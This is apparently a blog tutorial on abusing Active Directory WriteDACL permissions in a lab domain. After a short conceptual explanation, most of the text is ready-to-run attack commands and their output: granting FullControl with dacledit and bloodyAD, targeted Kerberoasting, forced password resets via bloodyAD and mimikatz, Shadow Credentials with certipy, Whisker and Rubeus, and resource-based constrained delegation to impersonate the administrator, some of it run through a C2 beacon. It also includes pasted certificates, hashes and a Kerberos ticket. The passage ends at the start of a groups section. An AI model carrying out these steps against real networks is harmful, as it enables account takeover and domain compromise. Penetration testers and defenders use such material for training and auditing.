---
title: ⚔️DACL - WriteDacl
date: 2025-10-28 01:07:00 +/-TTTT
categories: [DACL]
tags: [WriteDacl]     # TAG names should always be lowercase
image : /assets/images/writedaclbackground.png
---
> Author : lineeralgebra
{:.prompt-tip}

# **WriteDACL on User → User**

When discussing Active Directory object permissions, it’s important to understand how **WriteDACL** fits in compared to other rights such as **GenericAll**, **GenericWrite**, and **WriteOwner**.

- **GenericAll** – grants full control over the object, including the ability to modify attributes, change the owner, and edit the ACL. Essentially, it is a superset of all major rights.
- **GenericWrite** – allows modification of most properties on the object (e.g., resetting passwords, changing attributes), but it does **not** allow editing the ACL directly.
- **WriteOwner** – specifically allows changing the ownership of the object, but nothing else.
- **WriteDACL** – specifically allows modifying the object’s **Access Control List (ACL)**. This means an attacker can grant themselves (or others) additional permissions, such as FullControl, without touching other properties.

In practice, **WriteDACL is powerful because it enables privilege escalation**. For example:

1. User **akkoyun** has **WriteDACL** over user **karakoyun**.
2. **akkoyun** modifies the ACL of **karakoyun** and adds FullControl permissions for themselves.
3. Now, **akkoyun** can reset the password or perform any other privileged action against **karakoyun**.

### Why WriteDACL is Often Overlooked

Since **GenericAll** already includes **WriteDACL**, many people underestimate its standalone impact. However, spotting a **WriteDACL edge** in BloodHound is valuable because it highlights a clear **attack path** that may not be as obvious as a full **GenericAll** permission.

In short:

- **GenericAll = everything**
- **WriteDACL = edit ACLs only (but that’s often enough for escalation!)**

## **WriteDACL on User → User happening why?**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.
    
![alt text](../assets/images/dacl1.png)

    

Now we can go our target to verify

1. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 

![alt text](../assets/images/dacl81.png)

## **WriteDACL on User → User Verify.**

### **GenericAll on User → User Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
python3 main.py --auth "ldap+ntlm-password://lab.local\\akkoyun:Password@VALENOR-DC01.lab.local"

Type 'help' to see available commands.
$ find_object_aces akkoyun
```

![alt text](../assets/images/dacl82.png)

Very strong tool!!!

### **WriteDACL on User → User Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl83.png)

## **WriteDACL on User → User Attack**

As we said with WriteDacl we have `Full control over the object` but `we have to give us GenericAll` rigthts first.   and we can do Reset user password, add to group, **Kerberoasting etc etc.**

### **WriteDACL on User → User Attack Kerberoasting**

Lets start with give ourself **GenericAll** rights here and we will have full privileges.

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'akkoyun' -target 'karakoyun' 'lab.local/akkoyun:Password'

[*] DACL backed up to dacledit-20250907-185610.bak
[*] DACL modified successfully!  
```

we can do with dacledit or bloodyAD

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add genericAll karakoyun akkoyun
[+] akkoyun has now GenericAll on karakoyun
```

and after with any of them it will be;

![alt text](../assets/images/writedacltogenericall.png)

Now we can use GenericAll rights!

```bash
python3 targetedKerberoast.py -v -d 'lab.local' -u 'akkoyun' -p 'Password'
```

![alt text](../assets/images/dacl84.png)

### **WriteDACL on User → User Attack  Force Change Password**

Lets start with give ourself **GenericAll** rights here and we will have full privileges.

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'akkoyun' -target 'karakoyun' 'lab.local/akkoyun:Password'

[*] DACL backed up to dacledit-20250907-185610.bak
[*] DACL modified successfully!  
```

we can do with dacledit or bloodyAD

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add genericAll karakoyun akkoyun
[+] akkoyun has now GenericAll on karakoyun
```

and after with any of them it will be;

![alt text](../assets/images/writedacltogenericall.png)

Now we can use GenericAll rights! we can change password of this user!!

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password set password karakoyun NewPassword123!
[+] Password changed successfully!
```

or wtih mimikatzz!!! `lsadump::setntlm`

```bash
mimikatz lsadump::setntlm /user:karakoyun /password:VeryStrongPass1! /server:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl85.png)

### **WriteDACL on User → User Attack Shadow Credentials attack**

Thats the **BEST** way to do it cause ChangePassword is bad for OPSEC and kerberoasting?? maybe u will not able to crack password.!!!!

Lets start with give ourself **GenericAll** rights here and we will have full privileges.

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'akkoyun' -target 'karakoyun' 'lab.local/akkoyun:Password'

[*] DACL backed up to dacledit-20250907-185610.bak
[*] DACL modified successfully!  
```

we can do with dacledit or bloodyAD

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add genericAll karakoyun akkoyun
[+] akkoyun has now GenericAll on karakoyun
```

and after with any of them it will be;
![alt text](../assets/images/writedacltogenericall.png)


We can do easily with [certipy](https://github.com/ly4k/Certipy) btw!!!

```bash
certipy-ad shadow auto -username akkoyun@lab.local -password Password -account karakoyun -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl86.png)

### **WriteDACL on User → User Attack Shadow Credentials attack (C2)**

Thats the **BEST** way to do it cause ChangePassword is bad for OPSEC and kerberoasting?? maybe u will not able to crack password.!!!!

Lets start with give ourself **GenericAll** rights here and we will have full privileges.

1. Import powerview

```bash
powershell-import /home/elliot/tools/PowerView.ps1
```

1. Give **GenericAll** rights

```bash
powerpick Add-DomainObjectAcl -TargetIdentity karakoyun -PrincipalIdentity akkoyun -Rights All
```

1. Verify

```bash
powerpick Get-DomainObjectAcl -Identity karakoyun | Select-Object IdentityReference,SecurityIdentifier,ActiveDirectoryRights
```

![alt text](../assets/images/dacl87.png)

and we can convert sid to user

```bash
powerpick ConvertFrom-SID S-1-5-21-589091694-2085784919-2275157148-1243
[09/07 19:28:42] [+] host called home, sent: 10 bytes
[09/07 19:28:42] [*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-589091694-2085784919-2275157148-1243 (unmanaged)
[09/07 19:28:42] [+] host called home, sent: 137984 bytes
[09/07 19:28:45] [+] received output:
lab\akkoyun
```

and after with any of them it will be;
![alt text](../assets/images/writedacltogenericall.png)

Now lets do **Shadow Credentials attack**

 with [Whisker.exe](https://github.com/eladshamir/Whisker)!!! u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:karakoyun /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl88.png)

just use this command

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:karakoyun /certificate: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 /password:"NgcjSwzIeEGPkbI8" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl89.png)

## **WriteDACL on User → Computer Attack**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.,Now we can go our target to verify
3. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 
    
![alt text](../assets/images/dacl90.png)
    

## **WriteDACL on User → Computer Verify**

### **WriteDACL on User → Computer Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

![alt text](../assets/images/dacl91.png)

### **WriteDACL on User → Computer Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl92.png)

### **WriteDACL on User → Computer Attack** Shadow Credentials attack

We checked this before and it was really easy with [`certipy`](https://github.com/ly4k/Certipy) but BEFORE we have to give ourself **GenericAll** first!!!!!

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'akkoyun' -target 'TROY$' 'lab.local/akkoyun:Password'

[*] DACL backed up to dacledit-20250907-204841.bak
[*] DACL modified successfully!
```

or we can do with bloodyAD

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add genericAll TROY$ akkoyun          
[+] akkoyun has now GenericAll on TROY$
```

after that we will see

![alt text](../assets/images/dacl93.png)


now we can do **Shadow Credentials attack**

```bash
certipy-ad shadow auto -username akkoyun@lab.local -password Password -account TROY$ -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl94.png)

or with [Whisker.exe](https://github.com/eladshamir/Whisker)!!! u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:TROY$ /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl95.png)

just run this

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:TROY$ /certificate:MIIJsAIBAzCCCWwGCSqGSIb3DQEHAaCCCV0EgglZMIIJVTCCBg4GCSqGSIb3DQEHAaCCBf8EggX7MIIF9zCCBfMGCyqGSIb3DQEMCgECoIIE9jCCBPIwHAYKKoZIhvcNAQwBAzAOBAi/WIK2VY3l6QICB9AEggTQh1bTbGMjus+38tMo0UuB3Y2qi0INNIT66BTSxPaDSkDmSOUm7d8jzI2Rpw6M5YME2n+HevKhzE8SjhJqiAjLFsGVKdM3YkXrgnae0vk9vjEuGCPsyYHIZ/JQ7sXBxZwsgTD6YChswX+GMAyXEKkQEQY2R4Clgkx5CiCTa2pe5dh3ISGsz3wPBCvzU2IPDnA18d6jMzzWGrIJZozv8FMUO3DSpfKPmNuVKBkrcxwy2v4YbraDTeBW3bD8ozdXT3WHNlIqv/t89x4gBsmgftaknEZwwpHWopTiXOT+wszNAFvrohRczjO9JtFa5SyH5+ZZDx2WbRISwAyze1uHRHkHJ1s5CYIp6ixptTtfJo7niBm6tD0ijh8Z+VdXqeg1PaHjhfmvR4I2VWJz39SL2QqdXTbreCDDA3TjIB+TAf6JAzEcT1W0hYFHwKSPgCNX+3cON8rmMHEme3GFAfhwVqN/8Caz30YLKxUOow7a9PK+Kv2be6Oq6rlL3UQY09lEtM4vUkg10EMRdzbXHQW+kJixS9VaglCLAbx8YyEwxBBTdDlZ5aJQFVWUjraDTUlcAmTV4gBSYKDud4oAoNk2UrZJb1jevL+3kTER+Dr3H+TVa+ae4PapmrixDWBDAWBiSjwS+8WX+ZxEdspUJNOKqLqVUGcldJ1mnQl9DMSdE/w2owI5jBGNSZ2P0icic/5BWCm1kwpOpefafkyZN1M4KJ9P9EFyOi46p/5a8kNsxGTHUgI5wZIAytmyqCx73KeLr/U9ZUoCEfoIUV8ZCn37XfAMcdi0HA8MWTmUymaf/N9SR8moe29lKR1xzP76kfMCtZj5Sy5E+vI6eElDSr5EgKc1aZ54kHStwFzR36xSMkeDw4m7bs+kcv8bttG1q9jP27TesiiYNnPkph/dY0zZ8IIiDJ9NLwE4bR/QpPE2q0fplZvoKN4K0um6bJLeaiN0cwxde9jFuo2OAq8+6oxM/DV6rUTOyHfH5xCLWtINUjJQIdvLpds1LcGh3+7I/WW9emj9MyjwLbZGZOL6If6jq/F0qHHW8qYFDZ2awqSQiI/3OrSKyVfpY8K7iVN9qbC6I80SbotKrwCpYXiBauMKTohULR868wjcfKH3bVB8JPBA8fylHmKZVtDsHz7tUlMjTwKWtostAx4bYOfpvSoOTxvm6Ia5IyGOXhqIW/QyqoSuDnwbE+FyPrg0had8Mtn8A71aL7RdXO2dKfcGz4DA5WIWSKnqATLxx6biEatlbSDxTeZCzOghHl+2COiZSCtrPbZw+AqiLyhwTgIiGRP037Qf1B3Zyj4Lj0U/gDuI8gDRafTt9c9GMINbX7vTU51P7wlEBEHR5f0odBiOj++nEVRl+YUF2CcK+szyeUdE9/yEpsDgjlKC9qDyYBUvXvEaKW7q6puo2aqgu7EIE2xedAw93kytpreCAmLjDHdS/5EZ6Y+lL7/+5781a9U8B50ZK4LP7d9zpIpoTQehaK3p8b4Fjd2zk87WJhSmjWf6XsMJQA8YiqtFkmybdsPIVXx1dT4lOcPfxSmho/Wf9ZSmB3MGr1HimMKSPxDQCZAi2pjuXnj9O90def84xlU1pYxEsi2UMzjmznQafiYaQIzBlizvsOTq+R6LEwQv3a3PfDrJxf8xgekwEwYJKoZIhvcNAQkVMQYEBAEAAAAwVwYJKoZIhvcNAQkUMUoeSABkADIAOQA5ADIAOQA1ADkALQAzAGMAYQA0AC0ANAAyAGQAMwAtADkAOAA4ADgALQA3ADgAMwBiADEANQAzADUAZAAxADIAYzB5BgkrBgEEAYI3EQExbB5qAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAAUgBTAEEAIABhAG4AZAAgAEEARQBTACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcjCCAz8GCSqGSIb3DQEHBqCCAzAwggMsAgEAMIIDJQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQId4uBXsmS10cCAgfQgIIC+AA4Ay6s+HkSYfzsW5YbKEF3IgzkacmkKm2eZ98LY3bBZBJaelDL9dx1RnhmbrOyeaa33UAVdJxf7GOf+skU9onWEPcM/LPGnug2kD8tTvDNag2gC3VwLu0APRrBr6BajVg4AkqjRGZMMyo/zYBX88d6wXSPFpDNcdU2o9XohyNjbiS/RNImwJ2ojPlemut7WxMNHjIx1SiTr2yaTy/vpewHkf3vYXnKmzBVkQevDKb5qbm2rTOmIs251U28r2vzd4ATO/PwlxnvvWa4W8EEQBAcLqbD9mrHvnSBBhsnFPgZw1zGjTuAg28FD6KmeehPqrQD78vFxUh+a12KCK43OlZkIxQQZJ+8aTqCuA6YuCbIMAnjT1RAKS8mBqa0eUNM+ryad82xkamZARAIlaPI3ZK73T9LGb1N3aaPybE3JeUPPOFFiMwjr+NGIj2GPD+3wxoZSMcUOxMUV/sVTjfpWi7wpxfyONfD6HyjODFz9Fs/mfvCIQUy1pVI+/aBZioKNikYrVJRYcmubw2rwiT70GGfgP9UlRnOPwNL8ArOOGRfzBzq9wteiBUZIE/0fuSHi+wohmB686ZG82fJ1DfM4AtrbzkjxCL9FbB2VXfXrEpyxHt+BsembzBQsysKllR5vkZMb0qIEDfIvIRu2bOtl0dKoxjSSIJHSK/q3sDgsyfkvx+mzW/qVQLv4s7wsHsQ2+lJYUc/iz1uNGla04Szew1Oj6UK09VKb3HJiHY1tk3oSuQoVGCUZdq0v639gpKVn9d2MCLs/MoK1w/NfSwF/88KO6AGn/HAkktBSv+NEMmvTzupFvnoj7QL7035j/UAB7gsJtIVMuTq182po2xIzqNIcthGvvJ7RcFels1rTNIJYKN8Y2oZ2UznUwbdsgaXNdo2jclPuV/k4G02DqNk12mz1xXHkF1xDFE3rvmnGyHEGuL+P5ItEdDiMP7vpLzLIP4/eCMGr/48evhFuesQoGaDCqW8RsAV4icWBcCI2q43HoEMYO6LgjIwOzAfMAcGBSsOAwIaBBQ4qYEX02Q2FX1aYcTkhDXYPgfJPAQUKlm9cGf3ARXh4HUR2FqIdCqVZcACAgfQ /password:"2dV0NEEh8jHSYhb7" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl96.png)

### **GenericWrite on User → Computer Attack  Resource-Based Constrained Delegation**

Yes!! thats the another great way and common one!! we can do **RBCD** directly at target computer.

U can find commands here thats also great

and just use them;

```bash
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM5$' -computer-pass 'Summer2019!' -dc-host VALENOR-DC01.lab.local -domain-netbios lab.local 'lab.local/akkoyun:password'

rbcd.py -delegate-from 'ATTACKERSYSTEM5$' -delegate-to 'TROY$' -action 'write' 'lab.local/akkoyun:Password'

getST.py -spn 'cifs/TROY.lab.local' -impersonate 'administrator' 'lab.local/ATTACKERSYSTEM5$:Summer2019!'
```

![alt text](../assets/images/dacl97.png)


Lets do same thing on windows (C2)!!!

1. Lets add computer first!!

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/StandIn.exe --computer Ankara3 --make --Domain lab.local
```

![alt text](../assets/images/dacl98.png)

1. set RBCD

```bash
powershell-import /home/elliot/tools/PowerView.ps1

powerpick Set-ADComputer TROY -PrincipalsAllowedToDelegateToAccount Ankara3$

powerpick Get-ADComputer TROY -Properties PrincipalsAllowedToDelegateToAccount
```

![alt text](../assets/images/dacl99.png)

1. Lets get rc4 hash of attacker computer

```bash
execute-assembly /home/elliot/tools/Rubeus.exe hash /password:SeNWRhrpqX16ahA /user:Ankara3$ /domain:VALENOR-DC01.lab.local
[09/07 21:04:32] [*] Tasked beacon to run .NET program: Rubeus.exe hash /password:SeNWRhrpqX16ahA /user:Ankara3$ /domain:VALENOR-DC01.lab.local
[09/07 21:04:32] [+] host called home, sent: 556372 bytes
[09/07 21:04:32] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Calculate Password Hash(es)

[*] Input password             : SeNWRhrpqX16ahA
[*] Input username             : Ankara3$
[*] Input domain               : VALENOR-DC01.lab.local
[*] Salt                       : VALENOR-DC01.LAB.LOCALhostankara3.valenor-dc01.lab.local
[*]       rc4_hmac             : 105D6E61BD413BC9F503C34FE6187D81
[*]       aes128_cts_hmac_sha1 : CD096854386EFDAA00FE68B31575762A
[*]       aes256_cts_hmac_sha1 : C6199315E0F4C63D64A38307007B28B2B995A0814E0E69906D83E70089AEDDD9
[*]       des_cbc_md5          : 7A7CDF862A40C8DA
```

1. Now lets craete ticket for Administrator.

Command to execute:

```bash
execute-assembly /home/elliot/tools/Rubeus.exe s4u /user:Ankara3$ /password:SeNWRhrpqX16ahA /domain:lab.local /impersonateuser:administrator /rc4:105D6E61BD413BC9F503C34FE6187D81 /msdsspn:cifs/TROY.lab.local /nowrap
```

![alt text](../assets/images/dacl100.png)

```bash
echo -n "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" | base64 -d > ticket.kirbi

ticketConverter.py ticket.kirbi ticket.cache
```

![alt text](../assets/images/dacl101.png)

## **WriteDACL on User → Groups Attack (Linux Abuse)**

Thats the most common and favorite misconfiguration on AD envoirements. 

Lets check why is happening first and try to understand what we can do with when permission on `Groups`

